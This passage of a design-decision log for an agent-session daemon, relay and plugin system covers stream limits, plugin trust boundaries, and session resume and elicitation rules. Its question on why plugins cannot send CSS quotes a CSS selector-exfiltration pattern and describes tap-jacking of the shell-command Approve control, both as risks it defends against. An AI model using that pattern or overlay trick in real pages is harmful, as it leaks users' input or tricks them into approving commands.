sessions open on one machine is legitimately in double digits and two people are
double that. 64 is generous for one browser and a quarter of the tunnel, so four
callers can be at their ceiling before the tunnel's own limit is what refuses.

**Refused here rather than counted after the fact**, because the alternative is
letting the h2 session's own `maxConcurrentStreams` be the thing that answers —
and that one refuses at the protocol level, where there is nothing left to say
about *why*.

**The subject is never a request field.** It is the `sub` claim out of the token
the relay has already verified — the same value that rides `STREAM_SUBJECT_HEADER`
as advisory information for the daemon's logs, where it confers nothing. Here it
only divides a budget, which is a question about fairness rather than about
authority, and that is why reading it from a header would be a different kind of
mistake from the one `STREAM_SUBJECT_HEADER` already survives.

**Measured.** `relaycheck` asserts four things on one shared tunnel: a caller may
hold its whole share (exactly `MAX_STREAMS_PER_SUBJECT` streams, every one
granted), it is refused the one past it, **somebody else is unaffected** — which
is the half that is the point, being the request that would have been refused on
the owner's own machine with a perfectly healthy daemon at the other end — and a
closed stream gives the slot back, since a counter that only went up would turn a
busy afternoon into a machine that stops answering and never starts again.

**Status.** Current

### Q1.101 — Does "newest tunnel wins" extend to the presence row, or only to the map?

**Rule.** To both. `TunnelRegistry.register` overwrites **one row per machine**
via `presence.up` — the same "newest wins" the map just performed, rather than a
second row for a second socket — `unregister` calls `presence.down` *below* its
identity guard, and `closeAll` calls `presence.down` explicitly for each tunnel
before `this.tunnels.clear()`.

**Why the call sits below the guard.** It is the same sentence the map's identity
check exists for, one layer down. A superseded tunnel's close event fires *after*
its replacement registered, so a `presence.down` above the guard would delete the
row of the tunnel that is actually up. Of the two directions of staleness that is
the one nothing corrects: a stale `true` costs one probe and a `503 no_tunnel`,
which every client already turns into `forgetRoute()`, while a stale `false` draws
a reachable machine as offline and the client never probes it again.

**Why `closeAll` needs its own call.** `this.tunnels.clear()` is what makes every
later `unregister` a no-op, so without an explicit `presence.down` per tunnel the
row would survive a *clean* shutdown and go on claiming the machine for a whole
staleness window — the one case where the relay knows perfectly well that the
tunnel is gone.

**Status.** Current


### Q1.612 — What is a plugin trusted with?

**Position.** A plugin runs as you. It is a child process of the daemon, with your
uid, your `HOME`, your files and your keys — the same trade an agent already makes
on the same machine, and for the same reason: this is one person's own computer.

**Why the scope table is not a fence.** `manifest.scopes` is declared, shown at
install, and refused when exceeded. None of that stops anything: the child can
`import("node:fs")` and read everything the daemon can. The standing is exactly
`agentEnv()`'s — **hygiene, not a fence** — and the comment saying so is in
`api.ts` next to the gate, so nobody restores the stronger claim by reading the
code alone.

**What it does buy, which is three things and all of them real.** The blast radius
is *named*, which is what makes an install a decision somebody can take rather
than a leap. A plugin that hangs or crashes cannot take the daemon's single event
loop with it — that is what the child process is for, and it is the property that
matters most on a machine also running four agents. And the plugin never holds the
daemon's token or its database handle, because `pluginEnv()` strips every
`REEMOAT_*` name before the child starts.

**Rejected.** Claiming a sandbox. Node's permission model is process-wide rather
than per-worker, so a `Worker` cannot be confined at all and a child process could
only be confined by flags this daemon would have to guarantee across every
platform it runs on. Writing "sandboxed" over that would be the same lie the
settings screen refuses to tell next to a `~/.claude/settings.json` that has
already answered. The seam if one is ever wanted is `PluginRuntime` (Q1.616).

**Status.** Current

### Q1.613 — Why does no plugin code run in the browser?

**Decision.** A plugin returns a **description** of a screen and the web client
draws it with its own components. No plugin JavaScript is loaded, evaluated or
framed.

**Why.** `reemoat.credential` lives in that origin's `localStorage` and is the one
credential in this system that reaches the control plane. A plugin bundle
executing there would hold it, and every mitigation for that is a mitigation
rather than a boundary: a sandboxed iframe needs a second CSP, a versioned
`postMessage` bridge, and a decision about `frame-ancestors 'none'`, and it still
ends with somebody else's code running in a page this app also draws approvals in.
Refusing to run it at all is the only version of this that is a property rather
than a defence.

**What it costs, stated rather than hidden.** A plugin screen is a list, a form, a
set of columns and some text. It is not a canvas, and no amount of manifest will
make it one. That is written into `docs/PLUGINS.md` in those words, because an
author who discovers it after building something is an author who was misled.

**What it buys beyond the boundary.** Three things that would each have been work:
a plugin screen matches the rest of the app without its author thinking about it,
it works on a phone without its author thinking about it, and it cannot make the
session list slow.

**Precedent.** The app already renders a form somebody else described —
`ElicitationCard` draws an ACP elicitation from a schema an agent sent. The idea
is borrowed; the *type* deliberately is not, because that shape belongs to ACP and
one type serving two wires is one type changed by the wrong release.

**Status.** Current

### Q1.614 — A plugin has scopes and so does the caller. Which decides what?

**Rule.** Two axes, and neither implies the other. The scope on the route —
`session:read`, `session:write`, `machine:admin` — decides what the **caller** may
do. `manifest.scopes` decides what the **plugin** may do.

**Why both are needed.** A read-only grant may look at a plugin's screen and press
nothing on it; that is the caller axis, and it is the same one every other route
uses. But a hook has no caller at all — it runs because an agent finished a turn —
so the manifest is the only authority there is on that path. A design with one
axis either leaves hooks unauthorized or makes a plugin's authority depend on who
happened to open a screen.

**Measured consequence.** `daemoncheck` drives both: a read-only token listing
plugins and being refused an action, and a manifest declaring nothing being
refused every method in `SCOPE_OF` — swept over the table rather than asserted one
at a time, so a method added without an entry fails there rather than being
reachable by everybody.

**Rejected.** A new token scope for plugins. Unknown scope strings are dropped
rather than rejected on the way in, so a daemon that had not learnt it would
silently treat every plugin call as unauthorized — and the three that exist
already describe what a caller is doing here.

**Status.** Current

### Q1.615 — `src/` held exactly one `fetch`. It now holds two.

**Decision.** `enroll.ts`, and `net.fetch` made on a plugin's behalf in
`plugins/api.ts`. Both are named, here and in `.claude/rules/plugins.md`.

**Why the count mattered.** *"The daemon makes exactly one control-plane request,
ever"* is what makes a control-plane outage cost reachability rather than work in
flight (Q1.9), and the way that property was kept true was by counting: one
`fetch` in `src/`, and the count *was* the property.

**Why this one does not break it.** The substance is unchanged. This call is never
made by the daemon on its own behalf, never on a start path, never on a session
path, and only ever to a host somebody wrote into a manifest and approved at
install. A control plane that is down changes nothing about it.

**What is conceded.** The number is two, and a number is a worse guard than a
zero. So both are written down in two places, and the rule file says in as many
words that a count nobody restates is a count that becomes three. A plugin
*registry* to poll would be exactly that third one, and is refused for it
(Q7.104).

**Why the host makes the request rather than the plugin.** The plugin could open
its own socket — see Q1.612 — so this is not a fence either. It is a **tap**: one
place a plugin's outbound traffic can be seen, and one place the allowlist,
the https rule, the redirect refusal and the rate window are applied. Q7.86 is the
same lesson learnt the expensive way, when agent markdown could fetch from
anywhere with nothing watching.

**Status.** Current

### Q1.616 — Is `PluginRuntime` a sandbox seam or leftovers?

**Decision.** An interface with one implementation, kept as one deliberately —
the same standing `SessionRuntime` has, and written down for the same reason.

**Why.** It is the single place a confined plugin would be built, and naming it
now is cheaper than finding it later. But it earns its keep today without any of
that: it is what lets `daemoncheck` drive a start that never completes, an
invocation that is never answered, a crash after `ready` and an exhausted restart
budget — none of which is reachable by spawning a real process and hoping it
misbehaves on cue. Four lifecycle paths are asserted rather than hoped for
because this interface exists.

**Rejected.** A `kind` discriminant on it, for `SessionRuntime`'s stated reason:
an unread discriminant on the one interface that survived a deletion is how an
`if (kind === "sandboxed")` branch against nothing comes to be written.

**Status.** Current


### Q1.617 — Why can a plugin not send CSS?

**Question.** A plugin returns a description and the app draws it. Why not let it
send stylesheets, or restyle the app?

**The argument that does not carry the decision.** "CSS is dangerous" is mostly
untrue here. `expression()` is dead, `url(javascript:)` is dead, and the classic
selector-based exfiltration — `input[value^="a"] { background: url(https://…) }`
— is **already blocked by the CSP this app sends**: `default-src 'self'`,
`img-src 'self' blob:`. Refusing on those grounds would be overstating a narrow
risk, so it is written down here that it was considered and is not the reason.

**What is genuinely dangerous, and it is one thing.** This page approves shell
commands with a tap. Anything able to move pixels near that control is a
tap-jacking surface — cover the card, shift Approve under a thumb, make Deny
transparent. Scoping does not close it: Shadow DOM isolates *styles*, not
positioning, and a `position: fixed; inset: 0` element inside a plugin's own root
still paints over the whole app. It can be contained (`contain: paint`), and the
shape of that sentence is the tell: it is a defence being built around somebody
else's stylesheet rather than a property.

**Three reasons that outrank the security one.**

*The class names become a public API.* A plugin able to target `bg-surface`,
`edge-strong` or `--rail-w` is a plugin that breaks when `Sheet` or `bits.tsx` is
refactored — and unlike a protocol, CSS has no version to negotiate. This is
`DAEMON_VERSION`'s lockstep problem arriving through the stylesheet.

*Consistency is the feature.* A plugin screen currently gets a phone layout, the
monochrome palette, 44px on decision controls and legible type for free. CSS opts
its author out of all of it, and the first thing most would do is make their thing
**stand out** — in an interface built around *does anything need me*, where
attention is the scarce resource.

*The measured decisions stop binding.* Q3.205–Q3.210 carry chroma in OKLCH, a
≥3:1 floor on `edge-strong`, and the rule that `bg-fg` is only the affirmative
action inside a decision. A plugin with CSS violates all of them, and **its author
cannot see it**: they are on a desktop, and the failure is somebody outdoors with
a phone.

**What people actually want, and what is offered instead.** Almost always meaning
rather than pixels — *this row is urgent, this one is broken*. So the answer is
**more vocabulary, in tokens**: `PluginRowTone` is `ok|warn|danger` and the host
picks the ink, exactly as `PluginRowAction.tone` already did one field over. A
vocabulary is versioned, driven, and lands for every plugin at once.

**Reconsider if** a real plugin is blocked by the vocabulary — at which point the
answer is a block type for what it needs, not a stylesheet. The honest escape
hatch already exists: something needing full visual control is a web application,
and the plugin is the integration with it.

**Status.** Current

## Session lifecycle, questions and attachments

### Q2.1 — What happens to a live session when the daemon restarts?

**Decision.** A session reads as stopped only when somebody stopped it.
Everything else the daemon ended it brings back by itself, on the same
conversation, at the next boot, over ACP's `session/resume`.

**Why.** A deploy becomes something an operator waits out rather than
something that ends their work. The mechanism was already present and
nothing called it: `ManagedSession.resume` had always done the whole job,
and what was missing was a caller, a correct notion of which sessions
qualify, and driver coverage — `resume` appeared **zero** times in either
driver.

**Measured.** `claude-agent-acp` 0.63.0 advertises
`sessionCapabilities.resume` and maps it to `claude --resume=<uuid>`, where
the uuid *is* the ACP session id and the transcript is at
`~/.claude/projects/<sanitized-cwd>/<uuid>.jsonl`. kimi 0.29.2 implements it
and ignores the incoming `cwd` entirely.

**Status.** Current

### Q2.2 — Which ended sessions qualify for an automatic resume?

**Decision.** `autoResumable` is a `switch` over `ExitReason` with no
`default` arm, so adding a reason is a compile error rather than a silent
`false`:

| reason | at boot | on a prompt |
|---|---|---|
| `daemon_shutdown`, `daemon_restarted` | yes | yes |
| `agent_exited` | no | yes |
| `stopped`, `start_failed`, `start_timeout`, `agent_kill_failed` | no | no |

**Why.** `agent_exited` is the one judgement call, and it splits because the
boot pass has no recency fence: an agent that crashed on Tuesday would
otherwise be handed a fresh process by Friday's deploy, for a conversation
whose owner watched it die. A prompt is somebody explicitly asking, and "it
crashed, let me carry on" should work whenever they say it.

**Status.** Current

### Q2.3 — How does the daemon tell its own exits apart?

**Decision.** `status` derives through `endedWithDaemon`, so `interrupted`
means exactly *"the daemon ended this and it is coming back"*, and `doStop`
keeps the caller's reason while recording `agentConfirmedDead: false`
separately.

**Why.** Two defects had to be fixed before any of the resume rules were
expressible, and both were the same thing — the daemon could not tell its own
exits apart. *The ordinary deploy never produced `interrupted`:* a graceful
stop writes `daemon_shutdown`, which derived `exited` — the same value as
somebody pressing Stop — while `interrupted` was reachable only through the
hard-kill path that writes `daemon_restarted` at the *next* boot. So the
commonest way a session is interrupted rendered as "ended", the documentation
said the opposite in two places, and the warn-toned `interrupted` dot in
`bits.tsx` sat on a branch a deploy never took. *`doStop` discarded the
caller's reason:* it read `reason: confirmedDead ? reason :
"agent_kill_failed"`, so a SIGKILL that took longer than `KILL_CONFIRM_MS`
collapsed `daemon_shutdown` and `stopped` into one indistinguishable value —
erasing, on a loaded machine, precisely the distinction the whole feature
turns on. `agentConfirmedDead: false` already carried that fact *beside* the
reason rather than instead of it, and nothing ever read `agent_kill_failed`:
one write, one comment, two union members. A client can now render the state
without learning exit reasons.

**Status.** Current

### Q2.4 — Where does the boot resume pass run, and in what order?

**Decision.** `SessionRegistry.autoResume` is the boot pass and is
deliberately not part of `restore()`. It is started with `void` after the
listener is up and *outside* its callback. Most-recently-active first, two at
a time, three attempts, full jitter 2s→60s.

**Why.** `restore()` has to stay synchronous — the orphan reaping is fenced
on running before anything serves — so this is the async half. It runs
outside the listening callback because `wait_healthy` polls `/health` for 30s
during a deploy, and a boot sitting behind even two ACP handshakes would
report a healthy daemon as a failed update. Most-recently-active first,
because the session somebody was mid-turn on is the one they will open. Two
at a time, because each resume is a node subprocess with a `claude`
grandchild under it. One wasted spawn per agent binary is unavoidable —
`supportsSessionResume` can only be asked *after* an agent has started — so
an agent that refuses once is not asked again in that pass. Full jitter
rather than ±20%, because the attempts start together and a narrow band keeps
them synchronised.

**Status.** Current

### Q2.5 — What happens when a session's workspace is missing or unresponsive?

**Decision.** The workspace is checked before the spawn, with three answers
from `probeExists`. `false` means the worktree is gone: settled, costs no
attempt, never retried. `null` means a mount did not answer, which is treated
as a different fact entirely.

**Why.** On `false`, claude's adapter would reject the `cwd` anyway. `null`
is emphatically not the same thing: spending the retry budget on it would
abandon somebody's work over a sleeping NAS, and treating it as present would
park a fresh agent inside an uninterruptible kernel wait.

**Status.** Current

### Q2.6 — Does resume retry state survive a restart?

**Decision.** Retry state is in memory and resets on every restart, with
exactly one exception: `resourceNotFound` (-32002) on a resume, which
`session.ts` types as `SessionForgottenError` and which persists in
`sessions.resume_gave_up`. That verdict costs **no retry budget** and gates
both automatic paths.

**Why.** Retry state is a fact about *this process's* attempts, the same
category as `agentConfigState` and `contextUsage`, which `registry.ts` argues
at length must not be restored. A restart is *new information* — a new
binary, a re-signed-in agent, a remounted disk — and refusing to try because
a previous process failed would make the very deploy that fixes the bug fix
nothing. `resourceNotFound` is different in kind: it is a fact about the
*agent's* disk. The agent has said the conversation does not exist, and no
restart on this side changes what it holds — the same treatment
`workspace_missing` gets, for the same reason — so neither a boot nor a typed
message spawns an agent to be told the same thing again. `SCHEMA_VERSION`
deliberately does not move for the new column: a nullable column an older
daemon never selects is invisible to it, so a rollback keeps working, and
bumping the version would make `refuseNewerSchema` refuse one to buy nothing.

**Measured.** 2026-08-04, which is why the persisted verdict exists: ten
sessions were costing three agent spawns *each*, on every single restart, for
ever. The correlation was total — every session that resumed had a transcript
on disk, every one that failed did not. The cause attribution was wrong the
first time and the correction matters: it read "transcripts that did not
survive the move off containers", which is true of *six* of them — their
`cwd` has no project directory under `~/.claude/projects` at all, because the
transcripts were written inside a container. The other three had a project
directory, holding nine transcripts, with theirs missing. Those were
`/clear`, and they are a live recurring bug rather than a one-off (see Q2.7).

**Status.** Known limitation — the caveat is the adapter's rather than this
daemon's and is written at the constant: `claude-agent-acp` maps *two* SDK
failures onto this code, and one of them ("Query closed before response
received") is a transport hiccup rather than a settled fact. The two cannot
be told apart, so a session that a retry would have recovered can be
stranded. The way back is one manual `resume`; the alternative was an agent
spawned per dead session, per boot, indefinitely.

### Q2.7 — What does `/clear` do to a session's ability to resume?

**Decision.** Nothing repairs it. `/clear` breaks resume for that session and
it is not fixed: on the next boot, `session/resume` reattaches to the
*pre-clear* conversation.

**Why.** claude forks *underneath* the protocol — the ACP session id does not
change, so the stored id keeps naming the conversation the fork left behind,
and the live one has an id nobody reports. The consequence is the whole
reason this is recorded: a codeword somebody asked the agent to forget comes
back word for word, silently, on a deploy they did not ask for. Auto-resume
did not create the bug, but it did turn it from something a human triggered
by hand into something that fires on every restart.

**Measured.** 2026-08-05 against claude 0.63.0, in this order, because the
first two measurements produced a wrong theory and a reverted commit.
`/clear` works — the agent answers `NO MEMORY` immediately after — and the
ACP session id does not change. Verified by content rather than by inference:
after seeding a codeword and clearing, the project directory held two
transcripts, and the one named by the stored id still contained the codeword
while the new one did not.

**Rejected.** *A first fix was built and reverted.* The theory was that the
adapter starts addressing the client by the new id and the router discards
that traffic — it does key notifications on `sessionId: message.session_id`,
and the SDK does emit a `conversation_reset` the adapter drops. Plausible,
wrong: the id never moves, so the rename-following code could not fire.
Machinery justified by an event that does not occur was removed, drivers and
all.

**Status.** Known limitation — not fixed. What is not yet tried is
`session/list`: claude advertises `sessionCapabilities.list` and its adapter
implements `listSessions({dir: cwd})`, so the agent can be *asked* what
conversations it holds for a directory, and `AcpClient` does not implement
the call. Before building on it, measure whether the fork appears, whether
the ordering identifies it, and what happens when one directory holds
several — and if it cannot be identified, the honest answer is to stop
auto-resuming a cleared session rather than resume the wrong conversation.

### Q2.8 — Why does kimi refuse to resume a session left in plan mode?

**Decision.** `Session.resume` retries **once** without file IO, through
`LaunchOptions.fileIo`, when a resume answers `-32603`.

**Why.** Mode is one tap from the composer and is reached for several times
an hour, so "ended the day in plan mode" is ordinary rather than a corner
case — on the development machine it was the last session that would not come
back. The `fileIo` seam already existed for exactly this kind of deliberate
declining, so no new one was added. What is lost when the retry succeeds is
the `source: "fs_write"` half of a duplicated `file_change`. The rule is
narrow twice over: only `-32603`, the code that was measured, because every
other way a resume fails is already typed and widening this to "anything we
do not understand" would be guessing; and only on resume, because
`session/new` has never failed this way.

**Measured.** 2026-08-05 against kimi 0.29.2, deterministically:
`session/resume` answers `-32603 Internal error` when
`clientCapabilities.fs` is declared and the session was left in `plan`; it
resumes perfectly without the capability, and leaving plan mode before the
session ends also cures it. The cost of declining `fs` was measured long
before this need arose — with it, kimi made five reverse-RPC calls and claude
none; without it, neither made any, and both edit files perfectly well
themselves.

**Status.** Current

### Q2.9 — What happens to a cleared conversation the agent never wrote to disk?

**Decision.** Such a conversation is **opened rather than resumed**, decided
up front, gated on `conversationKnownEmpty`. That predicate has two arms: a
turn counter still at zero, or the tail of the log holding a
`context_cleared` with no `prompt` after it.

**Why.** `clearContext` mints an empty conversation through `session/new`,
and claude writes its transcript **lazily, with the first turn** — so a
restart landing between the clear and the next message finds an id naming
nothing on disk. Deciding up front means the doomed `session/resume` is not
attempted at all, which is one agent spawn instead of two and nothing about
it in the log. Opening another empty conversation is identical rather than
approximate, because there was nothing in the old one and empty is what
clearing asked for. Only the log arm has a window, and it fails safe outside
it — a marker older than the window is not found, so nothing is recreated.
The two arms do not subsume each other: `turnCounter` and `agentSessionId`
are written by the same row write, so a restore can never see one without the
other, but they do not describe the same conversation — `clearContext` moves
the id and leaves the counter alone, so after a clear the counter is still
counting the conversation the fork left behind. Reading "persisted beside
`agentSessionId`" as "the two always describe the same life" is the mistake
that would delete the log walk and reinstate the bug it was built for. Every
other lost conversation stays stalled, and must: silently handing somebody a
fresh agent while they expect their history restored is the same class of
quiet lie as handing back what they cleared.

**Measured.** The hard way in production, minutes after the clear
interception was deployed: the session came back `resourceNotFound` and could
not be resumed at all, which is a *worse* outcome than the bug the
interception was built to fix.

**Rejected.** The log arm took three attempts on a live session to get right,
and each wrong version passed its own driver case. *Comparing the marker's
`agentSessionId` to the current one* worked once and then never again: the
recovery opens another empty conversation and deliberately appends no marker
for it, so the next restart found no record naming the new id. *Dropping the
id check but returning on the first `prompt` after the first marker* was
wrong the other way: a session cleared twice has an older marker with a whole
conversation after it, and stopping there answers about a conversation two
generations dead. What is correct is the simplest form: walk the window and
let whichever came **last** decide, a marker or a prompt — a prompt resets
rather than concludes, so the `/clear` that precedes its own marker costs
nothing, and which id is current is not the question. Separately, *"no
`prompt` in the log"* was tried as the second arm and rejected in favour of
`turnCounter === 0`: an empty log is evidence of an empty log rather than of
an empty conversation, since events are pruned and a restored session may
keep its history where this store does not — that version broke twenty-four
driver cases at once. `turnCounter === 0` needs no window at all, because a
field on the row cannot age out of one.

**Status.** Current

### Q2.10 — May a `forgotten` verdict written by a previous daemon veto a recovery?

**Decision.** No. `resumeSettled` does not let a persisted `forgotten`
verdict filter a session out of the queue when this process knows a recovery
the previous one did not.

**Why.** The persisted verdict exists because a restart cannot change what is
on the agent's disk, which is true and is exactly why it must not also mean
"nothing can be done". The very first session the empty-conversation recovery
was written for had already been marked on the boot before, so it was
filtered out of the queue and the new code never ran.

**Status.** Current

### Q2.11 — What happens when a message is sent to a session the boot pass did not resume?

**Decision.** `POST /sessions/:id/prompt` resumes first — in the route, not
in `ManagedSession.prompt`, which is synchronous by contract. `resume()` is
memoised like `stopping`. `REEMOAT_AUTO_RESUME=0` turns off both paths.

**Why.** This covers the session the boot pass missed, gave up on, or has not
reached — and `agent_exited`, which the boot pass deliberately leaves alone.
A failure there falls through to the existing `409 session_terminal` rather
than inventing an error surface for a request that, from the caller's side,
is the one they always sent. Memoising means two prompts arriving together
join one launch instead of the second losing with `409 session_not_ready`.
The environment switch covers both paths because an operator who stopped
agents spawning at boot did not mean "spawn them on a keystroke instead".

**Status.** Current

### Q2.12 — Is the interrupted turn re-run after a resume?

**Decision.** No. Resume restores the conversation and says nothing; the
agent comes back *idle*, holding everything that was said, not carrying on
where it was cut off.

**Why.** Re-sending the last prompt was considered and refused: the agent may
have half-applied its edits and cannot tell how far it got, and synthesizing
text into the model's context is the thing the attachment rules already
forbid (see Q2.29). A pending approval is still gone as well — it holds a
live `resolve` closure that cannot be serialized.

**Status.** Known limitation

### Q2.13 — How does the client tell the restart states apart?

**Decision.** Four pure predicates in `wire.ts`, asserted as a partition:
`waitingForDaemon`, `resumeStalled` and `showsAsEnded` — exactly one holds
for any terminal session, none for a live one — plus `countsAsLive`. Every
one keys on `exit.reason` and never on `status` alone.

**Why.** A `status === "interrupted"` test would have been right for a hard
kill and wrong for every graceful restart there has ever been.
`countsAsLive` is a separate question on purpose: a stalled row belongs in
Active because a human must act, but must not inflate a count drawn beside a
green dot. Three consequences follow in the UI. `Composer.tsx` early-returns
on `showsAsEnded` rather than `isTerminal`, so **only a session the operator
ended loses its composer** — and that one line revived the `disabled` on
`AgentConfigBar` and the paperclip's own note about staging a file for a
terminal session, both dead code until then. `StatusDot` takes the session
and goes through `statusTone`, because a `Record<SessionStatus, string>`
cannot express a distinction that lives on `exit`. And
`POST /sessions/:id/prompt` joins `slowRoute`'s 90s budget unconditionally,
because `request` sees only a method and a path — a deadline that depended on
session state would be state leaking into the transport, and a deadline that
is too short here is a *transport* failure, which renders a healthy machine
"unreachable" over the message somebody just typed. `scripts/client.ts` stays
attached through a resume: `reportIfEnded` hand-rolled the terminal check as
a three-way `!==` chain, which is exactly the copy that would have missed
`daemon_shutdown`, and it reads the imported `endedWithDaemon` now. When the
resume lands, the `status: "starting"` the daemon appends arrives on the next
frame and the transcript carries on.

**Status.** Current

### Q2.14 — Why could the agent not ask the operator a question?

**Decision.** The daemon declares `clientCapabilities.elicitation.form` and
registers one handler for it. No custom tool is written.

**Why.** The tool was always there and this daemon was deleting it: claude's
own ask-the-user tool was stripped from the model's toolset before the CLI
started, on every session, and the model's only remaining move when it needed
a decision was to guess. Declaring the capability also enables questions
forwarded from MCP servers and the CLI's model-fallback consent prompt, both
through the same route.

**Measured.** Against `claude-agent-acp` 0.63.0: `disallowedTools =
elicitationSupport.form ? [] : ["AskUserQuestion"]` (`acp-agent.js:4109`),
where `elicitationSupport.form` is just `clientCapabilities.elicitation.form`.
The daemon declared `fs`, `terminal: false` and `session.configOptions` and
nothing else.

**Rejected.** Building an MCP ask-the-user tool was the obvious wrong answer:
the tool exists, the model is trained to reach for it, and a second one would
mean two ways to ask on one agent.

**Status.** Current

### Q2.15 — Can kimi ask the operator a question?

**Decision.** Yes, through the permission channel rather than the elicitation
one. kimi has its own `AskUserQuestion` and surfaces it as a
`session/request_permission` titled `AskUserQuestion`, with each answer an
`allow_once` option and a `reject_once` called `Skip`.

**Why.** The identical question arrives down the permission path on one agent
and the elicitation path on the other, so searching for one channel proved
nothing about the other.

**Measured.** kimi's bundle carries the ACP `elicitation_create` constant,
the SDK's caller and the MCP elicitation schemas, with **zero call sites of
its own** — the same "parses it, never emits it" shape as `usage_update`.
That half is still true. Measured 2026-08-06 against a live session, the
permission-path behaviour above.

**Rejected.** The conclusion *"kimi cannot ask you anything"* was previously
recorded on the strength of the elicitation search alone, and the correction
matters more than the measurement did.

**Status.** Reversed an earlier decision

### Q2.16 — Should a permission that is really a question be detected as one?

**Decision.** No. Nothing detects it. What is unified is the *chrome*, by
sharing a component rather than by resembling one: `ui/AskCard.tsx` is the
frame and `PermissionCard`/`ElicitationCard` are two bodies inside it.

**Why.** Recognising a permission as a question by its title, or by "every
option is `allow_once` bar one", is the id-keyed guessing this codebase
refuses everywhere else, and it would be wrong for the first agent that words
it differently. For one release the two cards were separate components
carrying the same class strings, which is "unified" exactly until somebody
edits one of them. They look alike because they are the same card, not
because one was recognised as the other.

**Status.** Current

### Q2.17 — How large is a real `AskUserQuestion` form?

**Decision.** The bounds are set against a measured form rather than a
guessed one: 8 fields is the real ceiling.

**Why.** The tool's own schema caps questions at 4, and each question brings
its own free-text `_custom` box, so four questions is eight fields.

**Measured.** 2026-08-06 against live claude, a two-question
`AskUserQuestion` through `pnpm harness --agent claude --json`: 2 questions →
**4 fields**; 4 options each; longest option value 19 characters; longest
description 155; `message` is the adapter's own "Please answer the following
questions."; nothing `required`; no `format`, no `default`, no `preview`;
~2.5 KiB in total.

**Status.** Current

### Q2.18 — Can the elicitation capability be withdrawn?

**Decision.** It is gated rather than merely undeclared.
`LaunchOptions.elicitation` is required with no default, the handler is
registered unconditionally and answers `methodNotFound` when declined, and
`REEMOAT_ELICITATION=0` withdraws it. The daemon prints which way it is set.

**Why.** Unlike the `fs` gate — whose sandbox does not exist — this one has a
live consequence: it changes what the *model* does, not what a client
renders. On a machine nobody is watching, a session that used to finish now
parks on a human until the turn is swept. It is the mirror of
`REEMOAT_AUTO_RESUME=0`.

**Status.** Current

### Q2.19 — How is a capability declined on the wire?

**Decision.** By omitting the key entirely. `ElicitationCapabilities.form` is
a marker with **no `false`**.

**Why.** This is a third capability shape read a third way, in one payload:
`promptCapabilities.image` is a declared boolean, so `acceptsImages` compares
`=== true`; `sessionCapabilities.resume` is an empty-object marker, so
`supportsSessionResume` compares `!= null`; `form` has to be absent. Reaching
for `{form: false}` is the obvious mistake and the compiler does catch it —
`form` is a named property rather than something `_meta` absorbs, so it is
`TS2559`.

**Status.** Current

### Q2.20 — Which elicitation modes and scopes are refused?

**Decision.** `url` mode is refused, and so is request scope (`requestId`
with no `sessionId`). Both are `invalidParams` and never `methodNotFound`.

**Why.** A URL is a URL on *this* host — most often an OAuth callback on
loopback — and this daemon is driven from a phone somewhere else; opening one
would mean launching a program named by an agent-chosen string, one door
along from what the "login command is a table lookup, never a request field"
rule forbids. It would also need `elicitation/complete`, a second settle path
no human drives. Request scope exists for auth phases before any session, and
this daemon has none — there is no session to block, no transcript to write
it into, no row to find it on. `methodNotFound` would claim the whole
capability is absent, a statement the next form request contradicts.

**Status.** Current

### Q2.21 — What is answered when a request cannot be rendered?

**Decision.** A JSON-RPC error, never a fabricated user action.

**Why.** `{action: "decline"}` is the tempting answer and it is a lie: nobody
declined. The error is also the kindest outcome for the model.

**Measured.** `handleAskUserQuestion` turns the error into `{behavior:
"deny", message: "Could not present the question to the user."}`, so the
model is told why and carries on, where a decline tells it a person chose to
skip.

**Status.** Current

### Q2.22 — How is an elicitation property schema validated?

**Decision.** The tag chooses the arm and each arm validates only what it
reads — strict about what is used, lenient about what is ignored.

**Why.** This is what `toCommands` does and what ACP's open unions are
designed for. Validating the whole payload refuses a form for reasons
unrelated to what the client can draw.

**Measured.** A `type: "string"` carrying one numeric `const` among good ones
took the unknown-type arm and refused everything.

**Rejected.** The SDK's `ElicitationPropertySchema.is*` guards were used and
taken back out, which is worth recording because reaching for them is the
obvious move and they sit next to the types. They validate the whole payload
rather than the tag, so *any* unexpected field — a `format: "hostname"`,
valid JSON Schema and not one of ACP's four; one `oneOf` entry whose `const`
is a number — makes a property match no variant and refuses the form.

**Status.** Reversed an earlier decision

### Q2.23 — What bounds an elicitation form?

**Decision.** Structure is refused and prose is truncated. Too many fields,
too many options, an option value too long, an unknown property type, or a
projected total over 32 KiB refuses the whole elicitation with the cap named
in the message; a long `message`, `title` or `description` is clipped.
`pattern` is dropped at ingest and never carried.

**Why.** This is the `MAX_COMMAND_NAME_CHARS` asymmetry one level up. A form
missing a question is not a smaller form, it is one whose answer *means
something different*, and an option's value round-trips to the agent so a
clipped one is a value it will not recognise. `clampBlob`'s `{truncated:
true, bytes}` is a fine thing to show above an Approve button and useless
above a form. An agent-chosen regular expression run in this process is a
ReDoS on the event loop, and carrying it for a client to enforce only moves
the hazard into a tab.

**Status.** Current

### Q2.24 — Does an elicitation form ride the session snapshot?

**Decision.** No. The snapshot carries only `message` and a field count, and
`GET /sessions/:id/elicitations/:id` serves the fields when a card opens. It
is not on the *event* either.

**Why.** A pending permission earns its 8 KiB on `SessionSnapshot` because *a
blocked session has to be answerable from the list*. A question is not
answerable from a list — the form has to be read and filled in — so this is
exactly where a command list lives, for exactly the same reason. An
unanswered request needs only its prompt to draw, and a resolved one is
self-describing.

**Status.** Current

### Q2.25 — How does a transcript draw an answered question?

**Decision.** `ElicitationResolvedEvent` carries the answer already rendered
into `label`/`value` pairs — the field's title and the option's *title*,
never its wire value — so a transcript draws it with no join back to the
request. Each `value` is clipped for the log alone.

**Why.** This is the `permissionDecisions` lesson pinned rather than
repeated: `PermissionResolvedEvent` carries only an `optionId`, which is how
a refused command came to be drawn with a check mark once the request row was
merged away. What reaches the agent is verbatim, because a shortened answer
is a wrong answer, and an over-long one is refused on the route rather than
cut.

**Status.** Current

### Q2.26 — Where do permission and elicitation ids come from?

**Decision.** One counter mints both kinds. `perm-N-salt` and `elic-N-salt`
come from the same `askSeq`/`askSalt`. The SQL columns are still
`perm_seq`/`perm_salt`; in TypeScript the type is `AnswerResolvedBy` and the
fields are `askSeq`/`askSalt`.

**Why.** The question the salt answers — *is this id from this session's this
life* — is identical for both, and the prefix already separates the spaces. A
second pair would have cost a second persisted column, i.e. a `migrate()`
ALTER and the `SCHEMA_VERSION` argument reopened, to buy gaps in each kind's
numbering that nothing reads as a count. `looksLikeOurs` takes the prefix, so
*"too old to report" must never come back as "never existed"* is one rule
with two callers. The SQL columns keep their old names because SQLite cannot
rename a column without rewriting a table that holds every transcript on
disk, which is the trade `owner_subject` is already left dead for. The
